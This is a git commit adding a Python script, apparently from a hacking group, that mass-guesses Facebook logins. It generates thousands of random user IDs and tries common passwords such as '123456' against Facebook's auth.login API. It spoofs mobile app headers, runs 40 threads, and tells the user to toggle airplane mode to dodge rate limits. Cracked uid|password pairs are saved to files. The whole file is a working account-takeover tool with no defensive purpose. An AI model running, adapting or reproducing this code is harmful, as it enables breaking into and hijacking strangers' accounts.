de4164853cc1e890abd9fe28a6dd8735321232a7
NOBITAxGM <songgm39@gmail.com>
2024-07-19 22:37:34 +0545

    Add files via upload

---
+++ v4.py
@@ -0,0 +1,211 @@
+#SCPRIT MACK BY : TEAM-AXP
+#SCPRIT OWNER : MR.PAPEL
+#GITHUB : MR-NOOB-404
+#-----------------------[ IMPORT-CODE ]-----------------------#
+import os
+import sys
+import marshal, base64, zlib
+from os import path
+import os,base64,zlib,pip,urllib
+try:
+        os.system('clear')
+        import os,uuid,base64,requests,zlib,httpx,time,platform,datetime
+        import os,sys,tempfile,string,random,subprocess,uuid
+        from time import localtime as lt
+        import os,requests,json,time,re,random,sys,uuid,string,subprocess,platform,httpx
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as Jahid
+        from concurrent.futures import ThreadPoolExecutor as tred
+except ModuleNotFoundError:
+        os.system('pip install requests futures==2 > /dev/null')
+except:pass
+#-----------------------[ PAPEL-CODE ]-----------------------#
+import os, platform, time, sys
+print(f'  \x1b[38;5;46m       <<< - WELCOME  - >>> ')
+print(f'  \x1b[38;5;46m       <<< - TEAM-AXP - >>> ');time.sleep(5)
+#-----------------------[ COLOR-CODE ]-----------------------#
+A = '\x1b[1;97m' 
+R = '\x1b[38;5;196m'
+Y = '\033[1;33m'
+G = '\x1b[38;5;48m'
+h = '\x1b[38;5;48m'
+B = '\x1b[38;5;8m'
+G1 = '\x1b[38;5;46m'
+G2 = '\x1b[38;5;47m'
+G3 = '\x1b[38;5;48m'
+G4 = '\x1b[38;5;49m'
+G5 = '\x1b[38;5;50m'
+X = '\33[1;34m'
+X1 = '\x1b[38;5;14m'
+X2 = '\x1b[38;5;123m'
+X3 = '\x1b[38;5;122m'
+X4 = '\x1b[38;5;86m'
+X5 = '\x1b[38;5;121m'
+S = '\x1b[1;96m'
+W = '\x1b[38;5;196m'
+sir = '\033[41m\x1b[1;97m'
+#-----------------------[ DATE-CODE ]-----------------------#		
+dic = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
+dic2 = {'01':'JANUARY','02':'FEBRUARY','03':'MARCH','04':'APRIL','05':'MAY','06':'JUNE','07':'JULY','08':'AUGUST','09':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DEVEMBER'}
+tgl = datetime.datetime.now().day
+bln = dic[(str(datetime.datetime.now().month))]
+thn = datetime.datetime.now().year
+okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+CPc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+date = str(tgl)+ '\x1b[38;5;196m ┼\x1b[38;5;46m ' +str(bln)+ ' \x1b[38;5;196m┼\x1b[38;5;46m ' +str(thn)
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"
+    def alvino_xy(u):
+        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
+def jahidj(u):
+        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
+#-----------------------[ LOOP-CODE ]-----------------------#
+user=[];ok=[];cp=[];twf=[];cpx=[];cokix=[];plist=[];loop=0
+oks=[]
+cps=[]
+loop=0
+folder_path = '/sdcard/XAPX'
+try:
+    os.makedirs(folder_path, exist_ok=True)
+except:
+    pass
+#-----------------------[ SC-CODE ]-----------------------#
+main_x=f'{R}({G1}1{R}){G1} BD RANDOM \n{R}({G1}2{R}){G1} INDIA RANDOM \n{R}({G1}3{R}){G1} NEPAL RANDOM';bd_x = f'{G1}017{R}/{G1}019{R}/{G1}018{R}/{G1}016';ind_x = f'{G1}+91639{R}/{G1}+91600{R}/{G1}+91620';line_x = f'{A}═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═';cp_x = f'{R}({G1}☂{R}) {G1}DO YOU WENT SHOW CP IDS {R}({G1}Y{R}/N{R})';coki_x =f'{R}({G1}☂{R}) {G1}DO YOU WENT SHOW COOKIES {R}({G1}Y{R}/N{R})';c =f'{R}({G1}☂{R}) {G1}CHOICE'
+#-----------------------[ UA-CODE ]-----------------------#
+#old ua def[👇]
+def windows():
+    aV=str(random.choice(range(10,20)))
+    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
+    bV=str(random.choice(range(1,36)))
+    bx=str(random.choice(range(34,38)))
+    bz=f"5{bx}.{bV}"
+    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
+    cV=str(random.choice(range(1,36)))
+    cx=str(random.choice(range(34,38)))
+    cz=f"5{cx}.{cV}"
+    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
+    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
+    return random.choice([A,B,C,D])
+#file ua def[👇]
+kkkkki = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
+def jahid():
+        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/{density=2.25,width=720,height=1280};FBLC/it_IT;FBRV/256855919;FBCR/WINDTRE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+str(kkkkki)+';FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
+        return ua
+       
+os.system("xdg-open  https://t.me/teamaxp")
+#-----------------------[ LOGO-CODE ]-----------------------#
+logo =(f"""{G1}  
+
+\033[31;1m⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
+\033[32;1m⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
+\033[33;1m⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
+\033[34;1m⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
+\033[35;1m⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
+\033[36;1m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
+\033[37;1m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
+\033[31;1m⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
+\033[32;1m⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
+\033[33;1m⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+\033[34;1m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
+
+\x1b[38;5;82m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+\x1b[38;5;82m┃    _   ______  ____  _____________    ┃NAME=SAMARPAN JABEU       ┃
+\x1b[38;5;82m┃   / | / / __ \/ __ )/  _/_  __/   |   ┃FACEBOOK=SAMARPANJABEGU   ┃
+\x1b[38;5;82m┃  /  |/ / / / / __  |/ /  / / / /| |   ┃VERSION=1.0               ┃
+\x1b[38;5;82m┃ / /|  / /_/ / /_/ // /  / / / ___ |   ┃WHATSAPP=+9779816029717   ┃
+\x1b[38;5;82m┃/_/ |_/\____/_____/___/ /_/ /_/  |_|   ┃GITHUB=MR×SPJL            ┃
+\x1b[38;5;82m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝""")
+#-----------------------[ CLEAR-CODE ]-----------------------#
+def fresh():os.system('clear');print(logo)
+#-----------------------[ LINE-CODE ]-----------------------#
+def line():print(f"{A}═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═")
+#-----------------------[ MAIN-CODE ]-----------------------#
+def Main():
+	print(logo)
+	print(f'{R}({G1}1{R}){G1} OLD CLONING')
+	print(f'{R}({G1}0{R}){G1} EXIT')
+	print(f"{A}═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═")
+	menu = input(f'{R}({G1}☂{R}){G1} INPUT : ')	
+	if menu in ['1']:
+		_old_()
+	if menu in ['0']:
+		exit()
+	else:
+		exit()
+
+#-----------------------[ OLD-CODE ]-----------------------#
+def _old_():
+       user=[]
+       fresh()
+       print(f'{R}({G1}☂{R}) {G1}EXAMPLE : {G1}3000{R}/{G1}5000{R}/{G1}10000{R}/{G1}99999');line()
+       limit=input(f"{R}({G1}☂{R}) {G1}INPUT : ")
+       fresh()
+       print(f'{R}({G1}1{R}) {G1}METHOD {R}({G1}BEST-1{R}) {G1}')
+       line()
+       ask=input(f"{R}({G1}☂{R}) {G1}INPUT : ")
+       if ask in["1"]:
+          star="10000"
+          for i in range(int(limit)):
+              data=str(random.choice(range(1000000000,9999999999)))
+              user.append(data)
+       else:
+        star="100000"
+        for i in range(int(limit)):
+            data=str(random.choice(range(100000000,999999999)))
+            user.append(data)
+    
+       with Jahid(max_workers=40) as skber:
+           fresh()
+           print(f'{R}({G1}☂{R}){G1} TOTAL ID : {limit} {R}({G1}☂{R}){G1} METHOD : M{R}┼{G1}{ask}')
+           print(f'{R}({G1}☂{R}){G1} TURN {R}({G1}ON{R}┼{G1}OFF{R}){G1} AIRPLANE MODE EVERY 3 MIN');line()
+           for mal in user:
+              uid=star+mal
+              skber.submit(login,uid)
+    
+loop=0
+oks=[]
+cps=[]
+
+def login(uid):
+    global oks,loop
+    Session=requests.session()
+    try:
+        sys.stdout.write(f'\r{R}[{G1}{date}{R}]{G1}━{R}>{G} {loop} \x1b[38;5;196m┼\x1b[38;5;46m {len(oks)} \x1b[38;5;196m┼\x1b[38;5;196m {len(cps)}')
+        sys.stdout.flush()
+        for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
+            headers = {
+            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
+            "x-fb-net-hni": str(random.randint(20000, 40000)), 
+            "x-fb-connection-quality": "EXCELLENT",
+            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+            "user-agent": windows(), 
+            "content-type": "application/x-www-form-urlencoded", 
+            "x-fb-http-engine": "Liger"}
+            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_GB&client_country_code=GB&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
+            if "session_key" in rp:
+                print(f"\r{R}[{R}MUGI-CP{R}]{R} {uid} | {pw}")
+                open("/sdcard/MUGI.txt","a").write(uid+"|"+pw+"\n")
+                cps.append(uid)
+                break 
+            elif "www.facebook.com" in rp["error_msg"]:          	
+            	print(f"\r{R}[{G1}MUGI-OK{R}]{G1} {uid} | {pw}")
+            	open("/sdcard/MUGI-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+            	oks.append(uid)
+            	break
+            elif "Please Confirm Email" in str(rp):            
+            	print(f"\r{R}[{G1}MUGI-OK{R}]{G1} {uid} | {pw}")
+            	open("/sdcard/MUGI-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+            	oks.append(uid)
+            	break
+            else:continue
+        loop+=1
+    except:pass
+
+#-----------------------[ AROVAL-CODE ]-----------------------#
+Main()
